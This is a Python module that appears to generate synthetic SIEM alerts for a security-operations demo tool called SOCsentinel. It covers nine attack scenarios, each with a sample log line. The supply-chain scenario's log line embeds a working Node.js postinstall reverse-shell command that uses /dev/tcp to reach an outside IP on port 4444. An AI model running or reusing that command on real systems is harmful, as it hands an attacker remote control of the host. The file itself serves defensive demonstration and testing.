"""
SOCsentinel — Synthetic alert generator.

Generates realistic SIEM alerts for demo scenarios
covering common attack patterns.
"""

import uuid
from datetime import datetime, timedelta
import random

from app.shared.schemas import AlertInput, Severity
from app.core.logger import get_logger

logger = get_logger(__name__)

# Pre-defined attack scenarios for demo
SCENARIOS = {
    "brute_force": {
        "rule_name": "Multiple Failed Login Attempts",
        "severity": Severity.HIGH,
        "description": "15 failed login attempts detected from external IP 203.0.113.42 targeting user 'admin' on authentication server AUTH-01 within 2 minutes.",
        "source_ip": "203.0.113.42",
        "destination_ip": "10.0.1.50",
        "destination_port": 443,
        "protocol": "HTTPS",
        "username": "admin",
        "hostname": "AUTH-01",
        "raw_log": "2026-05-05T10:00:00Z AUTH-01 sshd[12345]: Failed password for admin from 203.0.113.42 port 44521 ssh2 (attempt 15/15 in 120s)",
    },
    "lateral_movement": {
        "rule_name": "Suspicious Internal RDP Connection",
        "severity": Severity.HIGH,
        "description": "Unusual RDP connection from workstation WS-042 to domain controller DC-01 by user 'svc_backup' at 02:47 AM outside business hours.",
        "source_ip": "10.0.5.42",
        "destination_ip": "10.0.1.10",
        "destination_port": 3389,
        "protocol": "RDP",
        "username": "svc_backup",
        "hostname": "WS-042",
        "raw_log": "2026-05-05T02:47:00Z DC-01 Microsoft-Windows-TerminalServices-RemoteConnectionManager[1149]: RDP connection from 10.0.5.42 user svc_backup",
    },
    "data_exfiltration": {
        "rule_name": "Large Outbound Data Transfer",
        "severity": Severity.CRITICAL,
        "description": "Unusual outbound data transfer of 2.3GB detected from file server FS-01 to external IP 198.51.100.77 over DNS tunneling.",
        "source_ip": "10.0.2.100",
        "destination_ip": "198.51.100.77",
        "destination_port": 53,
        "protocol": "DNS",
        "username": "",
        "hostname": "FS-01",
        "raw_log": "2026-05-05T14:30:00Z FS-01 dns-proxy: Anomalous DNS query volume (4500 queries/min) to 198.51.100.77, total transfer ~2.3GB",
    },
    "phishing": {
        "rule_name": "Malicious URL Clicked in Email",
        "severity": Severity.MEDIUM,
        "description": "User 'j.smith' clicked a link in a phishing email leading to credential harvesting page mimicking corporate login portal.",
        "source_ip": "10.0.3.88",
        "destination_ip": "192.0.2.99",
        "destination_port": 443,
        "protocol": "HTTPS",
        "username": "j.smith",
        "hostname": "WS-088",
        "raw_log": "2026-05-05T11:15:00Z PROXY-01 squid: CONNECT 192.0.2.99:443 HTTP/1.1 - user=j.smith src=10.0.3.88 url=https://login-corp0rate.evil.com/auth",
    },
    "ransomware": {
        "rule_name": "Rapid File Encryption Detected",
        "severity": Severity.CRITICAL,
        "description": "Mass file encryption activity detected on file server FS-02. Over 500 files renamed with .encrypted extension in 30 seconds.",
        "source_ip": "10.0.2.200",
        "destination_ip": "10.0.2.200",
        "destination_port": 445,
        "protocol": "SMB",
        "username": "SYSTEM",
        "hostname": "FS-02",
        "raw_log": "2026-05-05T03:22:00Z FS-02 Microsoft-Windows-Security-Auditing[4663]: Mass file modification detected: 523 files renamed to *.encrypted in /shared/finance/",
    },
    "privilege_escalation": {
        "rule_name": "Suspicious Privilege Escalation via Sudo",
        "severity": Severity.HIGH,
        "description": "User 'dev_intern' executed sudo to spawn root shell on production server PROD-WEB-03. No prior sudo history for this user.",
        "source_ip": "10.0.4.15",
        "destination_ip": "10.0.1.30",
        "destination_port": 22,
        "protocol": "SSH",
        "username": "dev_intern",
        "hostname": "PROD-WEB-03",
        "raw_log": "2026-05-05T16:45:00Z PROD-WEB-03 sudo: dev_intern : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
    },
    "supply_chain": {
        "rule_name": "Compromised Package Dependency Detected",
        "severity": Severity.CRITICAL,
        "description": "CI/CD pipeline on BUILD-01 pulled npm package 'lodash-utils-v2' (typosquat) with embedded reverse shell. Package executed post-install script connecting to 45.33.32.156.",
        "source_ip": "10.0.6.10",
        "destination_ip": "45.33.32.156",
        "destination_port": 4444,
        "protocol": "TCP",
        "username": "ci_runner",
        "hostname": "BUILD-01",
        "raw_log": "2026-05-05T09:12:00Z BUILD-01 npm[8821]: postinstall lodash-utils-v2@1.0.3: node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/45.33.32.156/4444 0>&1\")'",
    },
    "insider_threat": {
        "rule_name": "Unusual Data Access by Authorized User",
        "severity": Severity.MEDIUM,
        "description": "User 'hr_manager' accessed 847 employee records including salary data outside business hours. Normal daily access is 15-20 records.",
        "source_ip": "10.0.3.55",
        "destination_ip": "10.0.2.5",
        "destination_port": 5432,
        "protocol": "PostgreSQL",
        "username": "hr_manager",
        "hostname": "HR-WS-12",
        "raw_log": "2026-05-05T23:30:00Z DB-01 postgresql: LOG: hr_manager executed SELECT * FROM employees JOIN salaries ON employees.id = salaries.emp_id (847 rows returned, avg 18/day)",
    },
    "cryptomining": {
        "rule_name": "Unauthorized GPU/CPU Mining Activity",
        "severity": Severity.HIGH,
        "description": "GPU compute node GPU-04 showing 99% utilization running unknown process 'xmrig' connecting to mining pool stratum+tcp://pool.minexmr.com:4444.",
        "source_ip": "10.0.7.4",
        "destination_ip": "104.238.222.54",
        "destination_port": 4444,
        "protocol": "Stratum",
        "username": "",
        "hostname": "GPU-04",
        "raw_log": "2026-05-05T04:00:00Z GPU-04 process-monitor: ALERT high_cpu process=xmrig pid=31337 cpu=99.2% gpu=98.7% net=stratum+tcp://pool.minexmr.com:4444 user=www-data",
    },
}


def generate_alert(scenario: str | None = None) -> AlertInput:
    """Generate a synthetic SIEM alert.

    Args:
        scenario: Specific scenario name. If None, picks randomly.
            Options: brute_force, lateral_movement, data_exfiltration,
            phishing, ransomware.

    Returns:
        AlertInput with realistic data.
    """
    if scenario and scenario in SCENARIOS:
        data = SCENARIOS[scenario]
    else:
        scenario = random.choice(list(SCENARIOS.keys()))
        data = SCENARIOS[scenario]

    alert = AlertInput(
        alert_id=f"ALERT-{uuid.uuid4().hex[:8].upper()}",
        source="synthetic_siem",
        timestamp=datetime.utcnow().isoformat() + "Z",
        rule_name=data["rule_name"],
        severity=data["severity"],
        description=data["description"],
        source_ip=data["source_ip"],
        destination_ip=data["destination_ip"],
        destination_port=data["destination_port"],
        protocol=data["protocol"],
        username=data["username"],
        hostname=data["hostname"],
        raw_log=data["raw_log"],
        metadata={"scenario": scenario, "generator": "socsentinel_synthetic"},
    )

    logger.info("Synthetic alert generated", alert_id=alert.alert_id, scenario=scenario)
    return alert


def generate_batch(count: int = 5) -> list[AlertInput]:
    """Generate a batch of synthetic alerts.

    Args:
        count: Number of alerts to generate.

    Returns:
        List of AlertInput instances.
    """
    scenarios = list(SCENARIOS.keys())
    alerts = []
    for i in range(count):
        scenario = scenarios[i % len(scenarios)]
        alerts.append(generate_alert(scenario))
    return alerts
